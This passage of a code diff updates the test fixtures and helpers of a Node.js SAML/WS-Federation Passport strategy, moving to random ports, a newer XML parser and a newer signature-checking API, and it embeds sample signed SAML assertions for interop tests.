app.get('/login-idp-with-querystring', passport.authenticate('samlp-idpurl-with-querystring', { protocol: 'samlp', RelayState: relayState }));\n+\n+    app.get('/login-signed-request-without-deflate', passport.authenticate('samlp-signedrequest-without-deflate', { protocol: 'samlp', RelayState: relayState }));\n+    app.get('/login-signed-request-post', passport.authenticate('samlp-signedrequest-post', { protocol: 'samlp', RelayState: relayState }));\n+    app.get('/login-signed-request-with-deflate', passport.authenticate('samlp-signedrequest-with-deflate', { protocol: 'samlp', RelayState: relayState }));\n+\n+    app.get('/login-custom-request-template',\n+        passport.authenticate('samlp-custom-request-template', { protocol: 'samlp', RelayState: relayState }));\n+\n+    app.post('/callback',\n+        function(req, res, next) {\n+            next();\n+        },\n+        passport.authenticate('samlp', { protocol: 'samlp' }),\n+        function(req, res) {\n+            res.json(req.user);\n+        }\n+    );\n+\n+    app.post('/callback/samlp-signedresponse',\n+        passport.authenticate('samlp-signedresponse', { protocol: 'samlp' }),\n+        function(req, res) {\n+            res.json(req.user);\n+        }\n+    );\n+\n+    app.post('/callback/samlp-signedresponse-invalidcert',\n+        passport.authenticate('samlp-signedresponse-invalidcert', { protocol: 'samlp' }),\n+        function(req, res) {\n+            res.json(req.user);\n+        }\n+    );\n+\n+    app.post('/callback/samlp-invalidcert',\n+        passport.authenticate('samlp-invalidcert', { protocol: 'samlp' }),\n+        function(req, res) {\n+            res.json(req.user);\n+        }\n+    );\n+\n+    app.post('/callback/samlp-signedresponse-signedassertion',\n+        passport.authenticate('samlp-signedresponse-signedassertion', { protocol: 'samlp' }),\n+        function(req, res) {\n+            res.json(req.user);\n+        }\n+    );\n+\n+    app.post('/callback/samlp-ping',\n+        passport.authenticate('samlp-ping', { protocol: 'samlp' }),\n+        function(req, res) {\n+            res.json(req.user);\n+        }\n+    );\n+\n+    app.post('/callback/samlp-okta',\n+        passport.authenticate('samlp-okta', { protocol: 'samlp' }),\n+        function(req, res) {\n+            res.json(req.user);\n+        }\n+    );\n+\n+    app.post('/callback/samlp-with-utf8',\n+        passport.authenticate('samlp-with-utf8', { protocol: 'samlp' }),\n+        function(req, res) {\n+            res.json(req.user);\n+        }\n+    );\n+\n+    app.post('/callback/samlp-with-ISO',\n+        passport.authenticate('samlp-with-ISO', { protocol: 'samlp' }),\n+        function(req, res) {\n+            res.json(req.user);\n+        }\n+    );\n+\n+    app.post('/callback/samlp-with-ISO-explicit',\n+        passport.authenticate('samlp-with-ISO-explicit', { protocol: 'samlp' }),\n+        function(req, res) {\n+            res.json(req.user);\n+        }\n+    );\n+\n+    app.post('/callback/samlp-with-invalid-xml',\n+        function (req, res, next) {\n+            passport.authenticate('samlp-with-utf8', { protocol: 'samlp' }, function(err, user, info) {\n+                res.send(400, { message: err.message });\n+            })(req, res, next);\n+        },\n+        function(req, res) {\n+            res.json(req.user);\n+        }\n+    );\n+\n+    app.post('/callback/samlp-with-dsig-at-root',\n+        passport.authenticate('samlp-with-dsig-at-root', { protocol: 'samlp' }),\n+        function(req, res) {\n+            res.json(req.user);\n+        }\n+    );\n+\n+    var server = http.createServer(app).listen(PORT, callback);\n+    module.exports.close = server.close.bind(server);\n };\n \n module.exports.relayState = relayState;\n module.exports.identityProviderUrl = identityProviderUrl;\n module.exports.fakeUser = fakeUser;\n module.exports.credentials = credentials;\n+module.exports.BASE_URL = BASE_URL;\n+module.exports.PORT = PORT;\n\\ No newline at end of file\n```\n\nFilename: test/fixture/wsfed-server.js:\n```\n@@ -8,16 +8,20 @@\nvar path = require('path');\n var passport = require('passport');\n var Strategy = require('../../lib/passport-wsfed-saml2').Strategy;\n \n+\n+const PORT = 3000 + Math.floor(Math.random() * 7000);\n+const BASE_URL = `http://localhost:${PORT}`;\n+\n passport.use(new Strategy(\n-  {\n-    path: '/callback',\n-    realm: 'urn:fixture-test',\n-    identityProviderUrl: 'http://localhost:5050/login',\n-    thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309']\n-  },\n-  function(profile, done) {\n-    return done(null, profile);\n-  })\n+    {\n+      path: '/callback',\n+      realm: 'urn:fixture-test',\n+      identityProviderUrl: `${BASE_URL}/login`,\n+      thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309']\n+    },\n+    function(profile, done) {\n+      return done(null, profile);\n+    })\n );\n \n var fakeUser = {\n\n@@ -70,37 +74,39 @@\nmodule.exports.start = function(options, callback){\n   });\n \n   function getPostURL (wtrealm, wreply, req, callback) {\n-    callback(null, 'http://localhost:5050/callback');\n+    callback(null, `${BASE_URL}/callback`);\n   }\n \n   app.get('/login',\n-    wsfed.auth(xtend({}, {\n-      issuer:             'fixture-test',\n-      getPostURL:         getPostURL,\n-      cert:               credentials.cert,\n-      key:                credentials.key\n-  }, options)));\n+      wsfed.auth(xtend({}, {\n+        issuer:             'fixture-test',\n+        getPostURL:         getPostURL,\n+        cert:               credentials.cert,\n+        key:                credentials.key\n+      }, options)));\n \n   app.post('/callback/wresult-with-invalid-xml',\n-    function (req, res, next) {\n-      passport.authenticate('wsfed-saml2', function(err, user, info) {\n-        res.send(400, { message: err.message });\n-      })(req, res, next);\n-    },\n-    function(req, res) {\n-      res.json(req.user);\n-    }\n+      function (req, res, next) {\n+        passport.authenticate('wsfed-saml2', function(err, user, info, status) {\n+          res.send(400, { message: info.detail.message });\n+        })(req, res, next);\n+      },\n+      function(req, res) {\n+        res.json(req.user);\n+      }\n   );\n \n   app.post('/callback',\n-    passport.authenticate('wsfed-saml2'),\n-    function(req, res) {\n-      res.json(req.user);\n-    });\n+      passport.authenticate('wsfed-saml2'),\n+      function(req, res) {\n+        res.json(req.user);\n+      });\n \n-  var server = http.createServer(app).listen(5050, callback);\n+  var server = http.createServer(app).listen(PORT, callback);\n   module.exports.close = server.close.bind(server);\n };\n \n module.exports.fakeUser = fakeUser;\n module.exports.credentials = credentials;\n+module.exports.BASE_URL = BASE_URL;\n+module.exports.PORT = PORT;\n\\ No newline at end of file\n```\n\nFilename: test/helpers.js:\n```\n@@ -1,65 +1,57 @@\n-var xmlCrypto = require('xml-crypto'),\n-    crypto = require('crypto'),\n-    xmldom = require('@auth0/xmldom');\n+const xmlCrypto = require('xml-crypto');\n+const xmldom = require('@xmldom/xmldom');\n+const xpath = require('xpath');\n \n exports.isValidSignature = function(assertion, cert) {\n-  var doc = new xmldom.DOMParser().parseFromString(assertion);\n-  var signature = xmlCrypto.xpath(doc, \"/*/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\")[0];\n-  var sig = new xmlCrypto.SignedXml(null, { idAttribute: 'AssertionID' });\n-  sig.keyInfoProvider = {\n-    getKeyInfo: function (key) {\n-      return \"<X509Data></X509Data>\";\n-    },\n-    getKey: function (keyInfo) {\n-      return cert;\n-    }\n-  };\n+  var doc = new xmldom.DOMParser().parseFromString(assertion, 'text/xml');\n+  var signature = xpath.select(\"/*/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\", doc)[0];\n+  var sig = new xmlCrypto.SignedXml({ publicCert: cert, getCertFromKeyInfo: () => null, idAttribute: 'AssertionID' });\n   sig.loadSignature(signature.toString());\n   return sig.checkSignature(assertion);\n };\n \n exports.getIssuer = function(assertion) {\n-  var doc = new xmldom.DOMParser().parseFromString(assertion);\n+  var doc = new xmldom.DOMParser().parseFromString(assertion, 'text/xml');\n   return doc.documentElement.getAttribute('Issuer');\n };\n \n exports.getAssertionID = function(assertion) {\n-  var doc = new xmldom.DOMParser().parseFromString(assertion);\n+  var doc = new xmldom.DOMParser().parseFromString(assertion, 'text/xml');\n   return doc.documentElement.getAttribute('AssertionID');\n };\n \n exports.getIssueInstant = function(assertion) {\n-  var doc = new xmldom.DOMParser().parseFromString(assertion);\n+  var doc = new xmldom.DOMParser().parseFromString(assertion, 'text/xml');\n   return doc.documentElement.getAttribute('IssueInstant');\n };\n \n exports.getConditions = function(assertion) {\n-  var doc = new xmldom.DOMParser().parseFromString(assertion);\n+  var doc = new xmldom.DOMParser().parseFromString(assertion, 'text/xml');\n   return doc.documentElement.getElementsByTagName('saml:Conditions');\n };\n \n exports.getAudiences = function(assertion) {\n-  var doc = new xmldom.DOMParser().parseFromString(assertion);\n+  var doc = new xmldom.DOMParser().parseFromString(assertion, 'text/xml');\n   return doc.documentElement\n-            .getElementsByTagName('saml:Conditions')[0]\n-            .getElementsByTagName('saml:AudienceRestrictionCondition')[0]\n-            .getElementsByTagName('saml:Audience');\n+      .getElementsByTagName('saml:Conditions')[0]\n+      .getElementsByTagName('saml:AudienceRestrictionCondition')[0]\n+      .getElementsByTagName('saml:Audience');\n };\n \n exports.getAuthenticationStatement = function(assertion) {\n-  var doc = new xmldom.DOMParser().parseFromString(assertion);\n+  var doc = new xmldom.DOMParser().parseFromString(assertion, 'text/xml');\n   return doc.documentElement\n-            .getElementsByTagName('saml:AuthenticationStatement')[0];\n+      .getElementsByTagName('saml:AuthenticationStatement')[0];\n };\n \n exports.getAttributes = function(assertion) {\n-  var doc = new xmldom.DOMParser().parseFromString(assertion);\n+  var doc = new xmldom.DOMParser().parseFromString(assertion, 'text/xml');\n   return doc.documentElement\n-            .getElementsByTagName('saml:Attribute');\n+      .getElementsByTagName('saml:Attribute');\n };\n \n exports.getNameIdentifier = function(assertion) {\n-  var doc = new xmldom.DOMParser().parseFromString(assertion);\n+  var doc = new xmldom.DOMParser().parseFromString(assertion, 'text/xml');\n   return doc.documentElement\n-            .getElementsByTagName('saml:NameIdentifier')[0];\n-};\n+      .getElementsByTagName('saml:NameIdentifier')[0];\n+};\n\\ No newline at end of file\n```\n\nFilename: test/interop.tests.js:\n```\n@@ -23,9 +23,9 @@\ndescribe('interop', function () {\n     var signedAssertion = '<Assertion ID=\"_1b1ffaef-86ef-42e1-92cf-cf8c9d9a4ce0\" IssueInstant=\"2013-04-02T18:50:24.000Z\" Version=\"2.0\" xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\"><Issuer>https://sts.windows.net/75696069-df44-4310-9bcf-08b45e3007c9/</Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /><ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\" /><ds:Reference URI=\"#_1b1ffaef-86ef-42e1-92cf-cf8c9d9a4ce0\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\" /><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\" /><ds:DigestValue>TzJmLs0BTPgpaPLsA7L2Kd9l1k4IBOmwIM/znV2iOPU=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>OHJCAffCNPRkwsE3RqnVPoCRSqsPrio8prABauzu2pqF418Y1QJuJehhzztY8A6kwnBUkBVE7BIyLe7kgCnBoNZWElYki1xtaLksc/Afc0TjlZvv9IJ9fQHIBiL1JA9KcySq1tu9dv/NauykBODXuljPuVTk6I4xLLWcg20o26Ov57axp42uWPpcJHtasomLmmmnAXEh6P7aB/1Vlm/MAJhWXToxacauJzFao3F9JNEuucKY6y3RPDp1Qq3vL0gq98RKuiaejayu6RjyyU2+8vCBzURul8b7ZXPUHfIOME6Q5LvbKqLhe/mzqRc+9GUg22X3B5SYjdnXjwHbBTbihA==</ds:SignatureValue><KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><X509Data><X509Certificate>MIIDPjCCAiqgAwIBAgIQVWmXY/+9RqFA/OG9kFulHDAJBgUrDgMCHQUAMC0xKzApBgNVBAMTImFjY291bnRzLmFjY2Vzc2NvbnRyb2wud2luZG93cy5uZXQwHhcNMTIwNjA3MDcwMDAwWhcNMTQwNjA3MDcwMDAwWjAtMSswKQYDVQQDEyJhY2NvdW50cy5hY2Nlc3Njb250cm9sLndpbmRvd3MubmV0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArCz8Sn3GGXmikH2MdTeGY1D711EORX/lVXpr+ecGgqfUWF8MPB07XkYuJ54DAuYT318+2XrzMjOtqkT94VkXmxv6dFGhG8YZ8vNMPd4tdj9c0lpvWQdqXtL1TlFRpD/P6UMEigfN0c9oWDg9U7Ilymgei0UXtf1gtcQbc5sSQU0S4vr9YJp2gLFIGK11Iqg4XSGdcI0QWLLkkC6cBukhVnd6BCYbLjTYy3fNs4DzNdemJlxGl8sLexFytBF6YApvSdus3nFXaMCtBGx16HzkK9ne3lobAwL2o79bP4imEGqg+ibvyNmbrwFGnQrBc1jTF9LyQX9q+louxVfHs6ZiVwIDAQABo2IwYDBeBgNVHQEEVzBVgBCxDDsLd8xkfOLKm4Q/SzjtoS8wLTErMCkGA1UEAxMiYWNjb3VudHMuYWNjZXNzY29udHJvbC53aW5kb3dzLm5ldIIQVWmXY/+9RqFA/OG9kFulHDAJBgUrDgMCHQUAA4IBAQAkJtxxm/ErgySlNk69+1odTMP8Oy6L0H17z7XGG3w4TqvTUSWaxD4hSFJ0e7mHLQLQD7oV/erACXwSZn2pMoZ89MBDjOMQA+e6QzGB7jmSzPTNmQgMLA8fWCfqPrz6zgH+1F1gNp8hJY57kfeVPBiyjuBmlTEBsBlzolY9dd/55qqfQk6cgSeCbHCy/RU/iep0+UsRMlSgPNNmqhj5gmN2AFVCN96zF694LwuPae5CeR2ZcVknexOWHYjFM0MgUSw0ubnGl0h9AJgGyhvNGcjQqu9vd1xkupFgaN+f7P3p3EVN5csBg5H94jEcQZT7EKeTiZ6bTrpDAnrr8tDCy8ng</X509Certificate></X509Data></KeyInfo></ds:Signature><Subject><NameID>10030000838D23AF@MicrosoftOnline.com</NameID><SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\" /></Subject><Conditions NotBefore=\"2013-04-02T18:50:23.969Z\" NotOnOrAfter=\"2013-04-03T06:50:23.969Z\"><AudienceRestriction><Audience>spn:408153f4-5960-43dc-9d4f-6b717d772c8d</Audience></AudienceRestriction></Conditions><AttributeStatement><Attribute Name=\"http://schemas.microsoft.com/identity/claims/tenantid\"><AttributeValue>75696069-df44-4310-9bcf-08b45e3007c9</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname\"><AttributeValue>Matias</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><AttributeValue>matias@auth0.onmicrosoft.com</AttributeValue></Attribute><Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname\"><AttributeValue>Woloski</AttributeValue></Attribute><Attribute Name=\"http://schemas.microsoft.com/identity/claims/identityprovider\"><AttributeValue>https://sts.windows.net/75696069-df44-4310-9bcf-08b45e3007c9/</AttributeValue></Attribute></AttributeStatement><AuthnStatement AuthnInstant=\"2013-04-02T18:50:16.000Z\"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef></AuthnContext></AuthnStatement></Assertion>';\n \n     var saml_passport = new SamlPassport({thumbprints: ['3464c5bdd2be7f2b6112e2f08e9c0024e33d9fe0'],\n-                                          realm: 'spn:408153f4-5960-43dc-9d4f-6b717d772c8d',\n-                                          checkExpiration: false, checkRecipient: false}); // dont check expiration since we are harcoding the token\n-    var profile = saml_passport.validateSamlAssertion(signedAssertion, function(err, profile) {\n+      realm: 'spn:408153f4-5960-43dc-9d4f-6b717d772c8d',\n+      checkExpiration: false, checkRecipient: false}); // dont check expiration since we are harcoding the token\n+    var profile = saml_passport.validateSamlAssertion(signedAssertion, {}, function(err, profile) {\n       if (err) return done(err);\n       assert.ok(profile);\n       done();\n\n@@ -40,7 +40,7 @@\ndescribe('interop', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5051/callback/samlp-signedresponse-signedassertion',\n+        uri: `${server.BASE_URL}/callback/samlp-signedresponse-signedassertion`,\n         form: { SAMLResponse: 'PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfZjEzOGQyZTUzMWQ0NjI0ZmNhZmQ4OGJlYWNmN2VjMzkwMzRmMmEzNzRkIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAxMy0wNy0wN1QxMTo1NToxOFoiIERlc3RpbmF0aW9uPSJodHRwczovL2xvZ2luLWRldjMuYXV0aDAuY29tOjMwMDAvbG9naW4vY2FsbGJhY2siIEluUmVzcG9uc2VUbz0iX2ZkMDY3N2ExZmRmMTU0Y2JmZGQwIj48c2FtbDpJc3N1ZXI+aHR0cHM6Ly9vcGVuaWRwLmZlaWRlLm5vPC9zYW1sOklzc3Vlcj48ZHM6U2lnbmF0dXJlIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj4KICA8ZHM6U2lnbmVkSW5mbz48ZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPgogICAgPGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNyc2Etc2hhMSIvPgogIDxkczpSZWZlcmVuY2UgVVJJPSIjX2YxMzhkMmU1MzFkNDYyNGZjYWZkODhiZWFjZjdlYzM5MDM0ZjJhMzc0ZCI+PGRzOlRyYW5zZm9ybXM+PGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8+PGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI3NoYTEiLz48ZHM6RGlnZXN0VmFsdWU+VXJHUURDSGF0eTRjNzZqTW5oWmZZb09qQ1RFPTwvZHM6RGlnZXN0VmFsdWU+PC9kczpSZWZlcmVuY2U+PC9kczpTaWduZWRJbmZvPjxkczpTaWduYXR1cmVWYWx1ZT5uSGZLUDRzbXliTHQxRTdwNVZJMkttUnZtL3RYMEpVRVNGYUN6ejM4M1RDMWpTU2JaODZKSVJYSVdMRXl1WTJCOTJBNHdmdC8zaHhqV2ZBNTNWUFdsYS93UzBEcitRbzUxU2svTzZNek1tbXRXakx2WVZhTDhvQ3lZUFZHSDlyWXZ4cnlnVXFyVkZDZVZhS3U5Y1VwVWpPdXZTYzM1dUovOEJFZUZ1cTdBMm89PC9kczpTaWduYXR1cmVWYWx1ZT4KPGRzOktleUluZm8+PGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU+TUlJQ2l6Q0NBZlFDQ1FDWTh0S2FNYzBCTWpBTkJna3Foa2lHOXcwQkFRVUZBRENCaVRFTE1Ba0dBMVVFQmhNQ1RrOHhFakFRQmdOVkJBZ1RDVlJ5YjI1a2FHVnBiVEVRTUE0R0ExVUVDaE1IVlU1SlRrVlVWREVPTUF3R0ExVUVDeE1GUm1WcFpHVXhHVEFYQmdOVkJBTVRFRzl3Wlc1cFpIQXVabVZwWkdVdWJtOHhLVEFuQmdrcWhraUc5dzBCQ1FFV0dtRnVaSEpsWVhNdWMyOXNZbVZ5WjBCMWJtbHVaWFIwTG01dk1CNFhEVEE0TURVd09EQTVNakkwT0ZvWERUTTFNRGt5TXpBNU1qSTBPRm93Z1lreEN6QUpCZ05WQkFZVEFrNVBNUkl3RUFZRFZRUUlFd2xVY205dVpHaGxhVzB4RURBT0JnTlZCQW9UQjFWT1NVNUZWRlF4RGpBTUJnTlZCQXNUQlVabGFXUmxNUmt3RndZRFZRUURFeEJ2Y0dWdWFXUndMbVpsYVdSbExtNXZNU2t3SndZSktvWklodmNOQVFrQkZocGhibVJ5WldGekxuTnZiR0psY21kQWRXNXBibVYwZEM1dWJ6Q0JuekFOQmdrcWhraUc5dzBCQVFFRkFBT0JqUUF3Z1lrQ2dZRUF0OGpMb3FJMVZUbHhBWjJheGlESVRoV2NBT1hkdThLa1ZVV2FOL1Nvb085TzBRUTdLUlVqU0dLTjlKSzY1QUZSRFhRa1dQQXU0SGxuTzRub1lsRlNMbll5RHhJNjZMQ3I3MXg0bGdGSmpxTGVBdkIvR3FCcUZmSVozWUsvTnJoblVxRndadTYzbkxyWmpjVVp4TmFQak9PU1JTRGFYcHYxa2I1azNqT2lTR0VDQXdFQUFUQU5CZ2txaGtpRzl3MEJBUVVGQUFPQmdRQlFZajRjQWFmV2FZZmpCVTJ6aTFFbHdTdElhSjVueXAvcy84QjhTQVBLMlQ3OU1jTXljY1Azd1NXMTNMSGttTTFqd0tlM0FDRlhCdnFHUU4wSWJjSDQ5aHUwRktoWUZNL0dQREpjSUhGQnNpeU1CWENocHllOXZCYVRORUJDdFUzS2pqeUcwaFJUMm1BUTloK2JrUG1PdmxFby9hSDB4UjY4WjlodzRQRjEzdz09PC9kczpYNTA5Q2VydGlmaWNhdGU+PC9kczpYNTA5RGF0YT48L2RzOktleUluZm8+PC9kczpTaWduYXR1cmU+PHNhbWxwOlN0YXR1cz48c2FtbHA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIi8+PC9zYW1scDpTdGF0dXM+PHNhbWw6QXNzZXJ0aW9uIHhtbG5zOnhzaT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEtaW5zdGFuY2UiIHhtbG5zOnhzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYSIgSUQ9Il9lYzM1MzRjN2Y2NjYzMjdlNmFmMTU0MzdiZTdiODk5OTU4ZDMwZGY5NzUiIFZlcnNpb249IjIuMCIgSXNzdWVJbnN0YW50PSIyMDEzLTA3LTA3VDExOjU1OjE4WiI+PHNhbWw6SXNzdWVyPmh0dHBzOi8vb3BlbmlkcC5mZWlkZS5ubzwvc2FtbDpJc3N1ZXI+PGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+CiAgPGRzOlNpZ25lZEluZm8+PGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz4KICAgIDxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjcnNhLXNoYTEiLz4KICA8ZHM6UmVmZXJlbmNlIFVSST0iI19lYzM1MzRjN2Y2NjYzMjdlNmFmMTU0MzdiZTdiODk5OTU4ZDMwZGY5NzUiPjxkczpUcmFuc2Zvcm1zPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjZW52ZWxvcGVkLXNpZ25hdHVyZSIvPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48L2RzOlRyYW5zZm9ybXM+PGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNzaGExIi8+PGRzOkRpZ2VzdFZhbHVlPlZPWVNVQlZZSUNvTWJwbk5INEVCRHhBUWtKTT08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU+RW1rR1docVZvZ25vNWhja01UcG9ySHFwT0szVDZpZ2JRVXA2Zmkxc1pvcXFsd3cxSUtmc3REMW1LdzVjM21JcldyNjFnOTh4TFMxLzBnMW5hUWlpT0MzbDl6Y0g3QUFIOVdGWW5JejdGeUE4dmllKzBxTE1Dbno4cVVpZ21HWDNRbEdiQ1QzUHVUNDEzUWlZSm9DT2VXME5zYUpaWUNINUFOWnprSUJsdG9nPTwvZHM6U2lnbmF0dXJlVmFsdWU+CjxkczpLZXlJbmZvPjxkczpYNTA5RGF0YT48ZHM6WDUwOUNlcnRpZmljYXRlPk1JSUNpekNDQWZRQ0NRQ1k4dEthTWMwQk1qQU5CZ2txaGtpRzl3MEJBUVVGQURDQmlURUxNQWtHQTFVRUJoTUNUazh4RWpBUUJnTlZCQWdUQ1ZSeWIyNWthR1ZwYlRFUU1BNEdBMVVFQ2hNSFZVNUpUa1ZVVkRFT01Bd0dBMVVFQ3hNRlJtVnBaR1V4R1RBWEJnTlZCQU1URUc5d1pXNXBaSEF1Wm1WcFpHVXVibTh4S1RBbkJna3Foa2lHOXcwQkNRRVdHbUZ1WkhKbFlYTXVjMjlzWW1WeVowQjFibWx1WlhSMExtNXZNQjRYRFRBNE1EVXdPREE1TWpJME9Gb1hEVE0xTURreU16QTVNakkwT0Zvd2dZa3hDekFKQmdOVkJBWVRBazVQTVJJd0VBWURWUVFJRXdsVWNtOXVaR2hsYVcweEVEQU9CZ05WQkFvVEIxVk9TVTVGVkZReERqQU1CZ05WQkFzVEJVWmxhV1JsTVJrd0Z3WURWUVFERXhCdmNHVnVhV1J3TG1abGFXUmxMbTV2TVNrd0p3WUpLb1pJaHZjTkFRa0JGaHBoYm1SeVpXRnpMbk52YkdKbGNtZEFkVzVwYm1WMGRDNXViekNCbnpBTkJna3Foa2lHOXcwQkFRRUZBQU9CalFBd2dZa0NnWUVBdDhqTG9xSTFWVGx4QVoyYXhpRElUaFdjQU9YZHU4S2tWVVdhTi9Tb29POU8wUVE3S1JValNHS045Sks2NUFGUkRYUWtXUEF1NEhsbk80bm9ZbEZTTG5ZeUR4STY2TENyNzF4NGxnRkpqcUxlQXZCL0dxQnFGZklaM1lLL05yaG5VcUZ3WnU2M25MclpqY1VaeE5hUGpPT1NSU0RhWHB2MWtiNWszak9pU0dFQ0F3RUFBVEFOQmdrcWhraUc5dzBCQVFVRkFBT0JnUUJRWWo0Y0FhZldhWWZqQlUyemkxRWx3U3RJYUo1bnlwL3MvOEI4U0FQSzJUNzlNY015Y2NQM3dTVzEzTEhrbU0xandLZTNBQ0ZYQnZxR1FOMEliY0g0OWh1MEZLaFlGTS9HUERKY0lIRkJzaXlNQlhDaHB5ZTl2QmFUTkVCQ3RVM0tqanlHMGhSVDJtQVE5aCtia1BtT3ZsRW8vYUgweFI2OFo5aHc0UEYxM3c9PTwvZHM6WDUwOUNlcnRpZmljYXRlPjwvZHM6WDUwOURhdGE+PC9kczpLZXlJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sOlN1YmplY3Q+PHNhbWw6TmFtZUlEIFNQTmFtZVF1YWxpZmllcj0idXJuOmF1dGgwOmxvZ2luLWRldjMiIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6dHJhbnNpZW50Ij5fOTVkYThhZjQ4MjY4NmEwY2VjZDY0Y2I3Y2FmOGU4NzFiN2FjMTFkYWUxPC9zYW1sOk5hbWVJRD48c2FtbDpTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI+PHNhbWw6U3ViamVjdENvbmZpcm1hdGlvbkRhdGEgTm90T25PckFmdGVyPSIyMDEzLTA3LTA3VDEyOjAwOjE4WiIgUmVjaXBpZW50PSJodHRwczovL2xvZ2luLWRldjMuYXV0aDAuY29tOjMwMDAvbG9naW4vY2FsbGJhY2siIEluUmVzcG9uc2VUbz0iX2ZkMDY3N2ExZmRmMTU0Y2JmZGQwIi8+PC9zYW1sOlN1YmplY3RDb25maXJtYXRpb24+PC9zYW1sOlN1YmplY3Q+PHNhbWw6Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMTMtMDctMDdUMTE6NTQ6NDhaIiBOb3RPbk9yQWZ0ZXI9IjIwMTMtMDctMDdUMTI6MDA6MThaIj48c2FtbDpBdWRpZW5jZVJlc3RyaWN0aW9uPjxzYW1sOkF1ZGllbmNlPnVybjphdXRoMDpsb2dpbi1kZXYzPC9zYW1sOkF1ZGllbmNlPjwvc2FtbDpBdWRpZW5jZVJlc3RyaWN0aW9uPjwvc2FtbDpDb25kaXRpb25zPjxzYW1sOkF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAxMy0wNy0wN1QxMToxMTo0MVoiIFNlc3Npb25Ob3RPbk9yQWZ0ZXI9IjIwMTMtMDctMDdUMTk6NTU6MThaIiBTZXNzaW9uSW5kZXg9Il81ZDA2MDZhMGIxZmQ5Nzk4ZDJhMjg3MjE5M2UzOWE5MDdhM2MwYmE0MTUiPjxzYW1sOkF1dGhuQ29udGV4dD48c2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6d